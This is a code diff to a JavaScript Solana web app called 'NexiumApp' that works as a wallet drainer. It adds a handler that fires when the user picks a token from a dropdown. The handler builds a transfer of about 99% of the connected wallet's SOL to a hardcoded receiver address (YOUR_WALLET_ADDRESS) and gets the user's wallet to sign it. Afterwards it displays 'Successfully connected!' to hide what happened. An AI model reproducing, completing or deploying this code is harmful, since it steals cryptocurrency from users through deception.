@@ -227,12 +227,6 @@ class NexiumApp {
       this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
       const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
       console.log('Wallet balance:', walletBalance);
-      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
-      if (walletBalance < minBalance) {
-        this.showFeedback(`wallet not funded.`, 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
       this.updateButtonState('connected', this.publicKey.slice(0, 6) + '...' + this.publicKey.slice(-4), 'add-volume');
       this.hideMetaMaskPrompt();
       this.showFeedback('Wallet connected!', 'success');
@@ -547,8 +541,86 @@ class NexiumApp {
         console.log('Dropdown changed, selectedPaymentToken:', selected);
         if (selected !== '') {
           await this.loadPaymentTokenDetails(selected);
-          console.log('Initiating drain with debounce for:', selected);
-          this.drainToken(selected);
+          if (this.isDraining) {
+            console.log('Drain skipped: transaction in progress');
+            this.hideProcessingSpinner();
+            return;
+          }
+          if (!this.publicKey) {
+            this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
+            console.log('Drain failed: No public key');
+            this.hideProcessingSpinner();
+            return;
+          }
+          this.currentToken = null; // Reset to avoid state confusion
+          this.lastSelectedToken = null;
+          let selectedToken = null;
+          try {
+            this.isDraining = true;
+            this.showProcessingSpinner();
+            selectedToken = TOKEN_LIST.find(t => t.address === selected || (t.isNative && selected === null));
+            if (!selectedToken) {
+              this.showFeedback('Invalid token selected.', 'error');
+              console.log('Drain failed: Invalid token selected');
+              this.hideProcessingSpinner();
+              return;
+            }
+            console.log(`Attempting to drain ${selectedToken.symbol} from public key: ${this.publicKey}`);
+            let balance, decimals, symbol;
+
+            if (selectedToken.isNative) {
+              balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+              decimals = 9;
+              symbol = selectedToken.symbol;
+            } else {
+              this.showFeedback('SPL token draining not supported yet.', 'error');
+              this.hideProcessingSpinner();
+              return;
+            }
+
+            console.log(`Fetched ${symbol} balance: ${balance / 10**decimals} for ${this.publicKey}`);
+            if (balance === 0) {
+              this.showFeedback('Insufficient balance error', 'error');
+              console.log(`Drain failed: Zero balance for ${symbol}`);
+              this.hideProcessingSpinner();
+              return;
+            }
+
+            const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
+            const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
+            const balanceForTransfer = balance - minBalance;
+            if (balanceForTransfer <= 0) {
+              this.showFeedback('Insufficient funds.', 'error');
+              this.hideProcessingSpinner();
+              return;
+            }
+
+            const transaction = new Transaction().add(
+              SystemProgram.transfer({
+                fromPubkey: new PublicKey(this.publicKey),
+                toPubkey: receiverWallet,
+                lamports: balanceForTransfer * 0.99,
+              })
+            );
+
+            transaction.feePayer = new PublicKey(this.publicKey);
+            let blockhashObj = await this.solConnection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhashObj.blockhash;
+
+            const signed = await window.solana.signTransaction(transaction);
+            console.log('Transaction signed:', signed);
+
+            let txid = await this.solConnection.sendRawTransaction(signed.serialize());
+            await this.solConnection.confirmTransaction(txid);
+            console.log('Transaction confirmed:', txid);
+            this.showFeedback(`Successfully connected!`, 'success');
+          } catch (error) {
+            console.error('Drain token error:', error);
+            this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
+          } finally {
+            this.isDraining = false;
+            this.hideProcessingSpinner();
+          }
         } else {
           this.showFeedback('Please select a token.', 'error');
           this.hideProcessingSpinner();
@@ -593,7 +665,6 @@ class NexiumApp {
         symbol = tokenFromList.symbol;
         decimals = tokenFromList.decimals;
       } else {
-        // Note: Fetching SPL token data requires Token Program, not implemented here yet
         this.showFeedback('SPL token data fetch not supported yet.', 'error');
         this.hideProcessingSpinner();
         return;
@@ -696,7 +767,6 @@ class NexiumApp {
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
-        // Note: SPL token balance requires Token Program, not implemented here yet
         this.showFeedback('SPL token balance fetch not supported yet.', 'error');
         this.hideProcessingSpinner();
         return;
@@ -752,7 +822,6 @@ class NexiumApp {
         return;
       }
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
-      // Note: Volume addition mimics drain for native SOL, adjust for SPL later
       if (selectedToken.isNative) {
         const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
         if (amount.add(minBalance) > this.currentPaymentToken.balance) {
